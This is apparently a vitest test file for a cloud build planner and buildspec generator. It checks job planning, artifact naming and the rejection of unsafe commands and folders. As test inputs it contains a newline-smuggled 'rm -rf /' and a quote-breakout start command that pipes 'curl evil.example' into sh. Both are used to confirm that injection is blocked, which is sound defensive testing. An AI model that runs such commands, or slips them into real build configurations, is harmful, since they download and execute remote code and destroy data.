import type { Component } from '@hero-cloud/core';
import { describe, expect, it } from 'vitest';
import { generateBuildspec } from './buildspec.js';
import {
  BUILD_IMAGE,
  artifactKey,
  assertSafeCommand,
  assertSafeDirectory,
  buildPlanFor,
  sourceKey,
} from './plan.js';

const component = (
  kind: Component['kind'],
  id: string,
  settings: Component['settings'] = {},
): Component => ({ id, kind, capability: kind, settings, rationale: [] });

describe('buildPlanFor', () => {
  it('builds sites that need it into a folder and services into a function bundle, and skips the rest', () => {
    const plan = buildPlanFor([
      component('static-site', 'site', { buildCommand: 'npm run build', outputDirectory: 'dist' }),
      component('http-service', 'api', { startCommand: 'node server.js', buildCommand: 'tsc' }),
      component('scheduled-job', 'jobs'),
      component('key-value-table', 'kv', { partitionKey: 'id' }),
      component('budget-alert', 'budget'),
    ]);
    expect(plan.image).toBe(BUILD_IMAGE);
    expect(plan.jobs.map((j) => [j.id, j.kind])).toEqual([
      ['site', 'static'],
      ['api', 'function'],
      ['jobs', 'function'],
    ]);
    expect(plan.jobs[0]).toMatchObject({ outputDirectory: 'dist', buildCommand: 'npm run build' });
    expect(plan.jobs[2]).toMatchObject({ jobFile: 'job.mjs' });
  });

  it('refuses commands and folders that could escape their line or folder', () => {
    for (const bad of ['', 'a\nb', 'x\u0000y', 'x'.repeat(501)]) {
      expect(() => assertSafeCommand(bad)).toThrow();
    }
    for (const bad of ['../x', '/abs', 'a/../b', 'a b', '']) {
      expect(() => assertSafeDirectory(bad)).toThrow();
    }
    expect(assertSafeDirectory('.')).toBe('.');
    expect(assertSafeDirectory('apps/web/dist')).toBe('apps/web/dist');
    expect(() =>
      buildPlanFor([component('static-site', 's', { buildCommand: 'a\nrm -rf /' })]),
    ).toThrow();
  });

  it('names artifacts and sources by deployment and content', () => {
    const [job] = buildPlanFor([
      component('http-service', 'my-api', { startCommand: 'node a.js' }),
    ]).jobs;
    expect(artifactKey('hero-x', job!, 'ab'.repeat(32))).toBe(
      `artifacts/hero-x/MyApi/${'ab'.repeat(8)}.zip`,
    );
    expect(sourceKey('hero-x', 'cd'.repeat(32))).toBe(`source/hero-x/${'cd'.repeat(8)}.zip`);
  });
});

describe('generateBuildspec', () => {
  const parse = (text: string) =>
    JSON.parse(text) as {
      phases: Record<string, { commands: string[] }>;
      artifacts: Record<string, unknown>;
    };

  it('for a site: installs, builds, and ships only the output folder', () => {
    const [job] = buildPlanFor([
      component('static-site', 'site', { buildCommand: 'npm run build', outputDirectory: 'dist' }),
    ]).jobs;
    const spec = parse(generateBuildspec(job!));
    expect(spec.phases.install?.commands[0]).toContain('npm ci');
    expect(spec.phases.build?.commands).toEqual(['npm run build']);
    expect(spec.artifacts['base-directory']).toBe('dist');
    expect(spec.artifacts['exclude-paths']).toContain('.env');
  });

  it('for a service: writes run.sh from base64 so the start command cannot break out', () => {
    const hostile = "node server.js'; curl evil.example | sh; echo '";
    const [job] = buildPlanFor([component('http-service', 'api', { startCommand: hostile })]).jobs;
    const text = generateBuildspec(job!);
    const spec = parse(text);
    const line = spec.phases.post_build?.commands[0] ?? '';
    expect(line).toMatch(/^echo [A-Za-z0-9+/=]+ \| base64 -d > run\.sh && chmod 755 run\.sh$/);
    expect(text).not.toContain('curl evil');
    const encoded = /echo (\S+) \|/.exec(line)?.[1] ?? '';
    expect(Buffer.from(encoded, 'base64').toString()).toBe(`#!/bin/sh\nexec ${hostile}\n`);
  });

  it('never reads a buildspec from the project and is deterministic', () => {
    const [job] = buildPlanFor([
      component('http-service', 'api', { startCommand: 'node a.js' }),
    ]).jobs;
    expect(generateBuildspec(job!)).toBe(generateBuildspec(job!));
    expect(generateBuildspec(job!)).not.toMatch(/buildspec\.ya?ml/);
  });

  it('checks a scheduled job file exists before packaging', () => {
    const [job] = buildPlanFor([component('scheduled-job', 'jobs')]).jobs;
    expect(parse(generateBuildspec(job!)).phases.post_build?.commands[0]).toContain('job.mjs');
  });
});
